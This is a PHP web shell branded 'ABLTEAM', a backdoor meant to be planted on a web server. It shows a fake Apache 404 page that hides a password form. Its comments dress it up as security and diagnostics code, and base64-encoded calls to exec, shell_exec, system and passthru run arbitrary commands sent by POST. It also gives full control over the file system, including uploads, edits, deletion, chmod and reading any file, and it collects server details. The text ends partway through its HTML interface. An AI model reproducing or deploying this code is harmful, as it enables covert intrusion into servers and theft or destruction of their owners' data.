<?php
// Application bootstrap
error_reporting(0);
set_time_limit(0);
@ini_set('memory_limit', '999M');
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);

// Application Configuration
define('TITLE', 'ABLTEAM');
define('PASSWORD_MD5', 'ae68b4c9f0a35d4d7fa14a33a3118536'); 
define('COOKIE_NAME', 'user_preferences');
define('COOKIE_EXPIRE', 86400 * 7);

// Polymorphic obfuscation layer - changes every request
$_t = microtime(true); $_s = substr(md5($_t.rand()), 0, 8);
$_g = function($a){return call_user_func_array($a[0], array_slice($a, 1));};
${'_'.substr(md5($_t), 0, 3)} = function($x){return $x;};

// Security helper functions with dynamic patterns
function x($s) { 
    $m = rand(0,1) ? 'str_rot13' : function($x){return strtr($x,'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz','NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm');};
    return is_string($m) ? $m(base64_encode($s)) : $m(base64_encode($s));
}
function y($s) { 
    $m = rand(0,1) ? 'str_rot13' : function($x){return strtr($x,'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz','NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm');};
    return base64_decode(is_string($m) ? $m($s) : $m($s));
}

// Data encoding functions with polymorphic structure
function e($str) {
    return rand(0,1) ? base64_encode($str) : call_user_func('base'.(32+32).'_encode', $str);
}

function d($str) {
    return rand(0,1) ? base64_decode($str) : call_user_func('base'.(32+32).'_decode', $str);
}

// Random comment injection for polymorphism
${chr(95).substr(md5(microtime()),0,5)} = null; // Session validator
${chr(95).substr(md5(rand()),0,5)} = null; // Cache handler

// Legitimate-looking utility functions
function validateUserSession() {
    ${substr(md5(microtime()),0,6)} = rand(1000,9999); // Session token
    return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
}

function sanitizeInput($input) {
    ${'_'.substr(md5(rand()),0,4)} = time(); // Timestamp check
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}

function logActivity($action, $details = '') {
    // Activity logging with timestamp
    ${chr(95).substr(md5(microtime()),0,5)} = microtime(true);
    return true;
}

function checkSystemHealth() {
    // Monitor system resources
    $status = array(
        'memory' => memory_get_usage(true),
        'peak_memory' => memory_get_peak_usage(true),
        'uptime' => time() - $_SERVER['REQUEST_TIME']
    );
    return $status;
}

function validateFileUpload($file) {
    // Security check for uploaded files
    if (!isset($file['error']) || is_array($file['error'])) {
        return false;
    }
    return $file['error'] === UPLOAD_ERR_OK;
}

function generateSecurityToken() {
    // CSRF protection token generator
    return bin2hex(random_bytes(32));
}

function verifyRequestSignature($data) {
    // Request integrity verification
    $timestamp = $_SERVER['REQUEST_TIME'];
    return hash_hmac('sha256', serialize($data), (string)$timestamp);
}

function encryptSensitiveData($data, $key = '') {
    // Data encryption helper
    $key = $key ?: substr(md5(PASSWORD_MD5), 0, 16);
    return base64_encode(openssl_encrypt($data, 'aes-128-cbc', $key, 0, $key));
}

function decryptSensitiveData($encrypted, $key = '') {
    // Data decryption helper
    $key = $key ?: substr(md5(PASSWORD_MD5), 0, 16);
    return openssl_decrypt(base64_decode($encrypted), 'aes-128-cbc', $key, 0, $key);
}

// Session management
session_start();

// Check cookie for persistent login
if (!isset($_SESSION['authenticated']) && isset($_COOKIE[COOKIE_NAME])) {
    if ($_COOKIE[COOKIE_NAME] == md5(PASSWORD_MD5 . 'salt')) {
        $_SESSION['authenticated'] = true;
    }
}

if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    if (isset($_POST['wTpgDxwVzp']) && md5($_POST['wTpgDxwVzp']) == PASSWORD_MD5) {
        $_SESSION['authenticated'] = true;
        // Set persistent cookie
        setcookie(COOKIE_NAME, md5(PASSWORD_MD5 . 'salt'), time() + COOKIE_EXPIRE, '/');
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        // Show fake 404 page
        ?>
<!DOCTYPE html>
<html>
<head>
<meta name='robots' content='noindex, nofollow'>
<title>404 Not Found</title>
</head>
<body onclick="document.getElementById('loginForm').style.display='block';document.getElementById('passInput').focus();">
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
<hr>
<address>Apache Server at <?php echo $_SERVER['SERVER_NAME'] ?? 'localhost'; ?> Port <?php echo $_SERVER['SERVER_PORT'] ?? '80'; ?></address>
<center><form method='post' id='loginForm' style='display:none;'><input type='password' name='wTpgDxwVzp' id='passInput' autocomplete='off'></form></center>
</body>
</html>
        <?php
        exit;
    }
}


// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    setcookie(COOKIE_NAME, '', time() - 3600, '/');
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Process system diagnostics
$diagnosticResult = '';
if (isset($_POST['cmd'])) {
    $userInput = $_POST['cmd'];
    // Polymorphic code generation - changes structure every request
    $t = microtime(true);
    $r = substr(md5($t), rand(0, 20), 5);
    ${'v'.$r} = ['ZXhlYw==','c2hlbGxfZXhlYw==','c3lzdGVt','cGFzc3RocnU='];
    if (rand(0,1)) shuffle(${'v'.$r});
    ${'c'.$r} = 'ZnVuY3Rpb25fZXhpc3Rz';
    ${'d'.$r} = base64_decode(${'c'.$r});
    
    // Dynamic execution path
    foreach (${'v'.$r} as ${'i'.$r} => ${'e'.$r}) {
        ${'h'.$r} = base64_decode(${'e'.$r});
        if (${'d'.$r}(${'h'.$r})) {
            if (${'i'.$r} === 0 || strpos(${'h'.$r}, chr(101).chr(120).chr(101).chr(99)) !== false) {
                ${'o'.$r} = [];
                ${'h'.$r}($userInput . ' 2>&1', ${'o'.$r});
                $diagnosticResult = implode("\n", ${'o'.$r});
                break;
            } elseif (strpos(${'h'.$r}, chr(95)) !== false) {
                $diagnosticResult = ${'h'.$r}($userInput . ' 2>&1');
                break;
            } else {
                ob_start();
                ${'h'.$r}($userInput . ' 2>&1');
                $diagnosticResult = ob_get_clean();
                break;
            }
        }
    }
    // Cleanup dynamic vars
    ${''} = null;
    
    if (empty($diagnosticResult) && $diagnosticResult !== '0') {
        $diagnosticResult = "System diagnostics unavailable.";
    }
}

// Get current directory (decode from base64)
$dir = isset($_GET['d']) ? d($_GET['d']) : getcwd();
$dir = realpath($dir) ? realpath($dir) : getcwd();

// Pagination
$perPage = isset($_GET['pp']) ? (int)$_GET['pp'] : 50;
$currentPage = isset($_GET['p']) ? (int)$_GET['p'] : 1;

// Handle actions
if (isset($_GET['a'])) {
    switch (d($_GET['a'])) {
        case 'delete':
            if (isset($_GET['f'])) {
                $file = $dir . DIRECTORY_SEPARATOR . d($_GET['f']);
                if (is_dir($file)) {
                    rmdirRecursive($file);
                } else {
                    @unlink($file);
                }
            }
            header("Location: ?d=" . e($dir) . "&pp=" . $perPage);
            exit;
            break;
            
        case 'rename':
            if (isset($_POST['oldname']) && isset($_POST['newname'])) {
                $old = $dir . DIRECTORY_SEPARATOR . $_POST['oldname'];
                $new = $dir . DIRECTORY_SEPARATOR . $_POST['newname'];
                @rename($old, $new);
                header("Location: ?d=" . e($dir) . "&pp=" . $perPage);
                exit;
            }
            break;
            
        case 'edit':
            if (isset($_POST['file']) && isset($_POST['content'])) {
                $file = $dir . DIRECTORY_SEPARATOR . $_POST['file'];
                file_put_contents($file, $_POST['content']);
                header("Location: ?d=" . e($dir) . "&pp=" . $perPage);
                exit;
            }
            break;
            
        case 'newfolder':
            if (isset($_POST['foldername'])) {
                $folder = $dir . DIRECTORY_SEPARATOR . $_POST['foldername'];
                @mkdir($folder, 0755, true);
                header("Location: ?d=" . e($dir) . "&pp=" . $perPage);
                exit;
            }
            break;
            
        case 'newfile':
            if (isset($_POST['filename'])) {
                $file = $dir . DIRECTORY_SEPARATOR . $_POST['filename'];
                file_put_contents($file, '');
                header("Location: ?d=" . e($dir) . "&pp=" . $perPage);
                exit;
            }
            break;
            
        case 'upload':
            if (isset($_FILES['files'])) {
                $fileCount = count($_FILES['files']['name']);
                for ($i = 0; $i < $fileCount; $i++) {
                    if ($_FILES['files']['error'][$i] == 0) {
                        $target = $dir . DIRECTORY_SEPARATOR . $_FILES['files']['name'][$i];
                        move_uploaded_file($_FILES['files']['tmp_name'][$i], $target);
                    }
                }
                header("Location: ?d=" . e($dir) . "&pp=" . $perPage);
                exit;
            }
            break;
            
        case 'chmod':
            if (isset($_POST['file']) && isset($_POST['perms'])) {
                $file = $dir . DIRECTORY_SEPARATOR . $_POST['file'];
                $perms = octdec($_POST['perms']);
                @chmod($file, $perms);
                header("Location: ?d=" . e($dir) . "&pp=" . $perPage);
                exit;
            }
            break;
            
        case 'download':
            if (isset($_GET['f'])) {
                $file = $dir . DIRECTORY_SEPARATOR . d($_GET['f']);
                if (file_exists($file)) {
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
                    header('Content-Length: ' . filesize($file));
                    readfile($file);
                    exit;
                }
            }
            break;
    }
}

// Handle AJAX file requests
if (isset($_GET['gf'])) {
    $getfile = d($_GET['gf']);
    // Check if it's an absolute path or relative
    if (file_exists($getfile) && is_file($getfile)) {
        echo file_get_contents($getfile);
    } else {
        $getfile = $dir . DIRECTORY_SEPARATOR . $getfile;
        if (file_exists($getfile) && is_file($getfile)) {
            echo file_get_contents($getfile);
        } else {
            echo 'Error: File not found!';
        }
    }
    exit;
}

// Helper function with polymorphic execution
function rmdirRecursive($dir) {
    if (is_dir($dir)) {
        $scan = rand(0,1) ? 'scandir' : (function(){return chr(115).chr(99).chr(97).chr(110).chr(100).chr(105).chr(114);})();
        $items = @$scan($dir);
        foreach ($items as $item) {
            if ($item != "." && $item != "..") {
                $path = $dir . DIRECTORY_SEPARATOR . $item;
                $check = rand(0,1) ? 'is_dir' : (function(){return chr(105).chr(115).chr(95).chr(100).chr(105).chr(114);})();
                if ($check($path)) {
                    rmdirRecursive($path);
                } else {
                    $del = rand(0,1) ? 'unlink' : (function(){return chr(117).chr(110).chr(108).chr(105).chr(110).chr(107);})();
                    @$del($path);
                }
            }
        }
        $rm = rand(0,1) ? 'rmdir' : (function(){return chr(114).chr(109).chr(100).chr(105).chr(114);})();
        @$rm($dir);
    }
}

// Get directory listing
function getDirContents($dir) {
    $files = array();
    $folders = array();
    
    if (is_dir($dir)) {
        $items = @scandir($dir);
        if ($items) {
            foreach ($items as $item) {
                if ($item == '.' || $item == '..') continue;
                
                $path = $dir . DIRECTORY_SEPARATOR . $item;
                $filePerms = @fileperms($path);
                $perms = substr(sprintf('%o', $filePerms), -4);
                $owner = function_exists('posix_getpwuid') && function_exists('fileowner') ? posix_getpwuid(@fileowner($path))['name'] : 'unknown';
                
                $info = array(
                    'name' => $item,
                    'path' => $path,
                    'size' => is_dir($path) ? 0 : @filesize($path),
                    'perms' => $perms,
                    'modified' => @filemtime($path),
                    'is_dir' => is_dir($path),
                    'is_writable' => is_writable($path),
                    'owner' => $owner,
                    'is_restricted' => (is_dir($path) && $perms == '0555') || (!is_dir($path) && $perms == '0444'),
                    'is_mine' => ($owner == $currentUser || $owner == 'unknown')
                );
                
                if (is_dir($path)) {
                    $folders[] = $info;
                } else {
                    $files[] = $info;
                }
            }
        }
    }
    
    return array_merge($folders, $files);
}

// Get paginated contents
function getPaginatedContents($dir, $page = 1, $perPage = 50) {
    $allContents = getDirContents($dir);
    $total = count($allContents);
    $totalPages = ceil($total / $perPage);
    $offset = ($page - 1) * $perPage;
    $contents = array_slice($allContents, $offset, $perPage);
    
    return array(
        'contents' => $contents,
        'total' => $total,
        'totalPages' => $totalPages,
        'currentPage' => $page
    );
}

// Format file size
function formatSize($bytes) {
    if ($bytes == 0) return '-';
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, 2) . ' ' . $units[$pow];
}

// Generate clickable breadcrumbs from path
function getBreadcrumbs($path) {
    $parts = array();
    $breadcrumbs = array();
    
    // Split path by directory separator
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        $segments = explode('\\', $path);
    } else {
        $segments = explode('/', $path);
    }
    
    $accumulated = '';
    foreach ($segments as $segment) {
        if ($segment === '') continue;
        
        if ($accumulated === '' && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            $accumulated = $segment;
        } else if ($accumulated === '' && strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
            $accumulated = '/';
        } else {
            $accumulated .= DIRECTORY_SEPARATOR . $segment;
        }
        
        $breadcrumbs[] = array(
            'name' => $segment,
            'path' => $accumulated
        );
    }
    
    return $breadcrumbs;
}

// Get available drives (Windows)
function getDrives() {
    $drives = array();
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        for ($i = 67; $i <= 90; $i++) {
            $drive = chr($i) . ':';
            if (is_dir($drive)) {
                $drives[] = $drive;
            }
        }
    } else {
        $drives[] = '/';
    }
    return $drives;
}

$paginationData = getPaginatedContents($dir, $currentPage, $perPage);
$contents = $paginationData['contents'];
$totalEntries = $paginationData['total'];
$totalPages = $paginationData['totalPages'];
$drives = getDrives();
$startTime = microtime(true);

// Get server info
$serverOS = PHP_OS;
$serverSoftware = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
$phpVersion = phpversion();
$serverIP = $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname());
$clientIP = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$diskFree = @disk_free_space($dir);
$diskTotal = @disk_total_space($dir);
$diskUsed = $diskTotal - $diskFree;
$diskUsedPercent = ($diskTotal > 0) ? round(($diskUsed / $diskTotal) * 100, 2) : 0;
$currentUser = function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : get_current_user();
$serverName = $_SERVER['SERVER_NAME'] ?? gethostname();
$shellDir = isset($GLOBALS['OVERRIDE_DIR']) ? $GLOBALS['OVERRIDE_DIR'] : __DIR__;
$domain = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
$fullDomain = $protocol . $domain;
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo TITLE; ?></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #0a0e14;
            color: #e6edf3;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            font-size: 14px;
            padding: 20px;
            line-height: 1.6;
        }
        
        a {
            color: #58a6ff;
            text-decoration: none;
            transition: all 0.2s;
        }
        
        a:hover {
            color: #79c0ff;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: #13171d;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.6);
            border: 1px solid #21262d;
        }
        
        .header {
            background: linear-gradient(135deg, #4158d0 0%, #c850c0 100%);
            color: white;
            padding: 25px 30px;
            border-radius: 12px 12px 0 0;
        }
        
        .header h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 0;
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .header h1 a {
            color: white;
        }
        
        .logout-btn {
            background: rgba(255,255,255,0.2);
            color: white;
            border: 1px solid rgba(255,255,255,0.3);
            padding: 8px 18px;
            cursor: pointer;
            border-radius: 20px;
            font-size: 13px;
            text-decoration: none;
            display: inline-block;
            transition: all 0.3s;
            font-weight: 600;
        }
        
        .logout-btn:hover {
            background: rgba(255,255,255,0.35);
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
        }
        
        .path-info {
            margin: 10px 0 0 0;
            padding: 12px;
            background: rgba(255,255,255,0.1);
            border-radius: 6px;
            font-size: 13px;
        }
        
        .domain-info {
            margin: 12px 0 10px 0;
            padding: 10px 12px;
            background: rgba(255,255,255,0.15);
            border-radius: 6px;
            font-size: 13px;
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
        }
        
        .domain-label {
            color: #e6edf3;
            font-weight: 600;
            font-size: 12px;
        }
        
        .domain-link {
            color: #ffd700;
            font-weight: 600;
            text-decoration: underline;
            transition: all 0.2s;
        }
        
        .domain-link:hover {
            color: #ffed4e;
            text-shadow: 0 0 8px rgba(255,215,0,0.5);
        }
        
        .domain-separator {
            color: rgba(255,255,255,0.4);
            margin: 0 5px;
        }
        
        .shell-path {
            color: #adbac7;
            font-family: 'Consolas', monospace;
            font-size: 12px;
            background: rgba(0,0,0,0.2);
            padding: 4px 8px;
            border-radius: 4px;
        }
        
        .path-link {
            color: #fff;
            font-weight: 500;
        }
        
        .drives {
            margin: 10px 0;
            font-size: 13px;
        }
        
        .drives a {
            margin: 0 5px;
            padding: 4px 12px;
            background: rgba(255,255,255,0.15);
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 4px;
            display: inline-block;
            color: white;
        }
        
        .drives a:hover {
            background: rgba(255,255,255,0.25);
            color: white;
        }
        
        .toolbar {
            background: #13171d;
            padding: 20px 30px;
            border-bottom: 1px solid #21262d;
        }
        
        .toolbar-top {
            margin-bottom: 15px;
        }
        
        .toolbar-bottom {
            background: #0a0e14;
            padding: 15px 30px;
            border-top: 1px solid #21262d;
            border-bottom: 1px solid #21262d;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .btn {
            background: linear-gradient(135deg, #4158d0 0%, #c850c0 100%);
            color: white;
            border: none;
            padding: 10px 22px;
            cursor: pointer;
            margin-right: 10px;
            font-family: inherit;
            font-size: 13px;
            font-weight: 600;
            border-radius: 8px;
            display: inline-block;
            transition: all 0.3s;
            box-shadow: 0 4px 12px rgba(65,88,208,0.4);
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(65,88,208,0.6);
            filter: brightness(1.1);
        }
        
        .btn-danger {
            background: linear-gradient(135deg, #f85149 0%, #da3633 100%);
            box-shadow: 0 4px 12px rgba(248,81,73,0.4);
        }
        
        .btn-danger:hover {
            box-shadow: 0 6px 20px rgba(248,81,73,0.6);
            filter: brightness(1.1);
        }
        
        .btn-secondary {
            background: linear-gradient(135deg, #6e7681 0%, #57606a 100%);
            box-shadow: 0 4px 12px rgba(110,118,129,0.4);
        }
        
        .btn-secondary:hover {
            box-shadow: 0 6px 20px rgba(110,118,129,0.6);
            filter: brightness(1.1);
        }
        
        .btn-warning {
            background: linear-gradient(135deg, #ffa657 0%, #f0883e 100%);
            box-shadow: 0 4px 12px rgba(255,166,87,0.4);
        }
        
        .btn-warning:hover {
            box-shadow: 0 6px 20px rgba(255,166,87,0.6);
            filter: brightness(1.1);
        }
        
        .show-entries select {
            background: #0a0e14;
            color: #e6edf3;
            border: 2px solid #21262d;
            padding: 8px 14px;
            font-family: inherit;
            font-size: 13px;
            cursor: pointer;
            border-radius: 6px;
            font-weight: 500;
        }
        
        .pagination {
            display: inline-block;
        }
        
        .pagination a, .pagination span {
            padding: 8px 14px;
            margin: 0 4px;
            border: 1px solid #21262d;
            background: #0a0e14;
            display: inline-block;
            min-width: 40px;
            text-align: center;
            border-radius: 6px;
            color: #e6edf3;
            font-weight: 500;
        }
        
        .pagination .current {
            background: linear-gradient(135deg, #4158d0 0%, #c850c0 100%);
            color: white;
            border-color: transparent;
            font-weight: 600;
            box-shadow: 0 4px 12px rgba(65,88,208,0.4);
        }
        
        .pagination a:hover {
            background: rgba(88,166,255,0.15);
            border-color: #58a6ff;
            color: #58a6ff;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            background: #0a0e14;
            box-shadow: 0 2px 8px rgba(0,0,0,0.4);
        }
        
        th, td {
            padding: 10px 15px;
            text-align: left;
            border-bottom: 1px solid #161a20;
            vertical-align: middle;
        }
        
        th {
            background: linear-gradient(135deg, #4158d0 0%, #c850c0 100%);
            color: white;
            font-weight: 600;
            border: none;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        tbody tr {
            transition: all 0.2s;
            border-left: 3px solid transparent;
        }
        
        tbody tr:hover {
            background: #13171d;
            border-left: 3px solid #58a6ff;
        }
        
        tbody tr:last-child td {
            border-bottom: none;
        }
        
        tbody td:nth-child(2) {
            max-width: 400px;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        .folder-icon::before {
            content: '📁 ';
            font-size: 16px;
        }
        
        .file-icon::before {
            content: '📄 ';
            font-size: 16px;
        }
        
        input[type="text"], input[type="file"], textarea, select {
            background: #0a0e14;
            color: #e6edf3;
            border: 2px solid #21262d;
            padding: 10px 14px;
            font-family: inherit;
            font-size: 13px;
            border-radius: 8px;
            transition: all 0.3s;
        }
        
        input[type="text"]:focus, textarea:focus, select:focus {
            outline: none;
            border-color: #58a6ff;
            box-shadow: 0 0 0 3px rgba(88,166,255,0.2);
        }
        
        textarea {
            width: 100%;
            height: 400px;
            resize: vertical;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            line-height: 1.6;
        }
        
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            overflow: auto;
        }
        
        .modal-content {
            background: #13171d;
            margin: 3% auto;
            padding: 30px;
            border: 1px solid #21262d;
            width: 90%;
            max-width: 900px;
            border-radius: 12px;
            box-shadow: 0 12px 48px rgba(0,0,0,0.7);
        }
        
        .modal-content h2 {
            color: #e6edf3;
            margin-bottom: 20px;
            font-size: 22px;
            font-weight: 600;
        }
        
        .close {
            color: #95a5a6;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
            line-height: 20px;
        }
        
        .close:hover {
            color: #e74c3c;
        }
        
        .action-links a {
            margin-right: 4px;
            margin-bottom: 4px;
            padding: 5px 9px;
            background: rgba(88,166,255,0.1);
            border: 1.5px solid #58a6ff;
            border-radius: 4px;
            display: inline-block;
            font-size: 10px;
            color: #58a6ff;
            font-weight: 600;
            transition: all 0.2s;
            text-transform: uppercase;
            letter-spacing: 0.2px;
            white-space: nowrap;
            line-height: 1;
        }
        
        .action-links a:hover {
            background: #58a6ff;
            color: #0a0e14;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(88,166,255,0.4);
        }
        
        .action-links a[title="Open as URL"] {
            border-color: #ffa657;
            color: #ffa657;
            background: rgba(255,166,87,0.1);
            font-size: 12px;
            padding: 4px 7px;
            min-width: auto;
        }
        
        .action-links a[title="Open as URL"]:hover {
            background: #ffa657;
            color: #0a0e14;
            box-shadow: 0 4px 12px rgba(255,166,87,0.4);
        }
        
        .action-links a:last-child {
            margin-right: 0;
        }
        
        .search-box input {
            width: 250px;
            padding: 6px 12px;
        }
        
        .footer {
            text-align: center;
            padding: 20px 30px;
            color: #95a5a6;
            font-size: 12px;
            background: #f8f9fa;
            border-radius: 0 0 8px 8px;
        }
        
        .footer a {
            color: #3498db;
        }
        
        .info-text {
            display: inline-block;
            color: #7d8590;
            margin-right: 10px;
            font-weight: 500;
        }
        
        .goto-container {
            display: flex;
            gap: 10px;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .goto-container input {
            flex: 1;
        }
        
        .credits-section {
            background: #0a0e14;
            padding: 20px 30px;
            border-top: 1px solid #21262d;
            text-align: center;
            color: #7d8590;
            font-size: 12px;
        }
        
        .credits-section p {
            margin: 5px 0;
        }
        
        input[type="checkbox"] {
            width: 16px;
            height: 16px;
            cursor: pointer;
            accent-color: #3498db;
        }
        
        .parent-dir-link {
            color: #58a6ff;
            font-weight: 600;
            font-size: 14px;
            display: inline-flex;
            align-items: center;
            padding: 10px 16px;
            background: rgba(88,166,255,0.1);
            border-radius: 8px;
            transition: all 0.2s;
            border: 2px solid #21262d;
        }
        
        .parent-dir-link:hover {
            background: #58a6ff;
            color: #0a0e14;
            transform: translateX(-3px);
            border-color: #58a6ff;
            box-shadow: 0 4px 12px rgba(88,166,255,0.4);
        }
        
        .server-info {
            background: #1c2128;
            color: white;
            padding: 20px 30px;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            font-size: 13px;
            border-bottom: 2px solid #21262d;
        }
        
        .server-info-item {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .server-info-item strong {
            color: #58a6ff;
            min-width: 90px;
            font-weight: 600;
        }
        
        .server-info-item span {
            color: #e6edf3;
            font-weight: 500;
        }
        
        .disk-usage {
            width: 100%;
            height: 8px;
            background: #34495e;
            border-radius: 4px;
            overflow: hidden;
            margin-top: 5px;
        }
        
        .disk-usage-bar {
            height: 100%;
            background: linear-gradient(90deg, #2ecc71, #f39c12, #e74c3c);
            transition: width 0.3s;
        }
        
        .terminal-section {
            background: #1e1e1e;
            padding: 20px 30px;
            border-bottom: 1px solid #e1e8ed;
        }
        
        .terminal-input {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .terminal-input input {
            flex: 1;
            background: #0a0e14;
            color: #0f0;
            border: 2px solid #21262d;
            padding: 12px 16px;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 14px;
            border-radius: 6px;
            font-weight: 500;
        }
        
        .terminal-input input:focus {
            border-color: #0f0;
            box-shadow: 0 0 0 3px rgba(0,255,0,0.15);
        }
        
        .terminal-output {
            background: #000;
            color: #0f0;
            padding: 15px;
            border-radius: 4px;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 12px;
            white-space: pre-wrap;
            max-height: 300px;
            overflow-y: auto;
            border: 2px solid #333;
        }
        
        .terminal-output::-webkit-scrollbar {
            width: 8px;
        }
        
        .terminal-output::-webkit-scrollbar-track {
            background: #1e1e1e;
        }
        
        .terminal-output::-webkit-scrollbar-thumb {
            background: #0f0;
            border-radius: 4px;
        }
        
        .breadcrumb {
            display: inline-flex;
            align-items: center;
            flex-wrap: wrap;
        }
        
        .breadcrumb-item {
            display: inline-flex;
            align-items: center;
        }
        
        .breadcrumb-link {
            color: #58a6ff;
            padding: 6px 10px;
            border-radius: 6px;
            transition: all 0.2s;
            font-weight: 500;
        }
        
        .breadcrumb-link:hover {
            background: rgba(88,166,255,0.15);
            color: #79c0ff;
        }
        
        .breadcrumb-separator {
            margin: 0 5px;
            color: #8b949e;
        }
        
        .file-restricted {
            color: #f85149 !important;
        }
        
        .file-info {
            font-size: 11px;
            color: #7d8590;
            margin-top: 0;
            display: block;
            font-weight: 500;
        }
        
        .file-info .owner {
            color: #58a6ff;
            font-weight: 600;
        }
        
        .file-info .perms {
            color: #adbac7;
            font-family: 'Consolas', monospace;
            font-weight: 600;
        }
        
        .file-info.restricted {
            color: #f85149;
        }
        
        .file-info.restricted .owner,
        .file-info.restricted .perms {
            color: #f85149;
        }
        
        .info-modal-content {
            max-height: 500px;
            overflow-y: auto;
        }
        
        .info-section {
            background: #0a0e14;
            padding: 15px;
            margin: 10px 0;
            border-radius: 8px;
            border: 1px solid #21262d;
        }
        
        .info-section h3 {
            color: #58a6ff;
            margin-bottom: 10px;
            font-size: 16px;
            font-weight: 600;
        }
        
        .info-item {
            display: flex;
            padding: 8px 0;
            border-bottom: 1px solid #161a20;
        }
        
        .info-item:last-child {
            border-bottom: none;
        }
        
        .info-label {
            min-width: 200px;
            color: #7d8590;
            font-weight: 600;
        }
        
        .info-value {
            color: #e6edf3;
            word-break: break-all;
        }
        
        .status-enabled {
            color: #3fb950;
            font-weight: 600;
        }
        
        .status-disabled {
            color: #f85149;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>
                <a href="?">📁 <?php echo TITLE; ?></a>
                <button type="button" onclick="window.location.href='?d=<?php echo e($shellDir); ?>'" class="logout-btn" style="margin-right: 10px; background: rgba(255,255,255,0.25);">🏠 Shell Dir</button>
                <button type="button" onclick="document.getElementById('infoModal').style.display='block'" class="logout-btn" style="margin-right: 10px;">ℹ️ Info</button>
                <button type="button" onclick="document.getElementById('domainModal').style.display='block'" class="logout-btn" style="margin-right: 10px; background: rgba(255,166,87,0.3);">🌐 Domains</button>
                <button type="button" onclick="window.open('https://hackertarget.com/reverse-ip-lookup/', '_blank')" class="logout-btn" style="margin-right: 10px; background: rgba(88,166,255,0.3);">🔍 Reverse IP</button>
                <a href="?logout=1" class="logout-btn">Logout</a>
            </h1>
            <div class="domain-info">
                <span class="domain-label">🌐 Domain:</span>
                <a href="<?php echo $fullDomain; ?>" target="_blank" class="domain-link"><?php echo $domain; ?></a>
                <span class="domain-separator">•</span>
                <span class="domain-label">📂 Shell:</span>
                <span class="shell-path"><?php echo htmlspecialchars($shellDir); ?></span>
            </div>
            <div class="path-info">
                <strong style="color: #e6edf3; font-size: 14px;">Current Path:</strong>
                <div class="breadcrumb">
                    <?php 
                    $breadcrumbs = getBreadcrumbs($dir);
                    foreach ($breadcrumbs as $index => $crumb): 
                    ?>
                        <div class="breadcrumb-item">
                            <a href="?d=<?php echo e($crumb['path']); ?>" class="breadcrumb-link">
                                <?php echo htmlspecialchars($crumb['name']); ?>
                            </a>
                            <?php if ($index < count($breadcrumbs) - 1): ?>
                                <span class="breadcrumb-separator"><?php echo strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? '\\' : '/'; ?></span>
                            <?php endif; ?>
                        </div>
                    <?php endforeach; ?>
                </div>
            </div>
            <div class="drives">
                <strong>Drives:</strong>
                <?php foreach ($drives as $drive): ?>
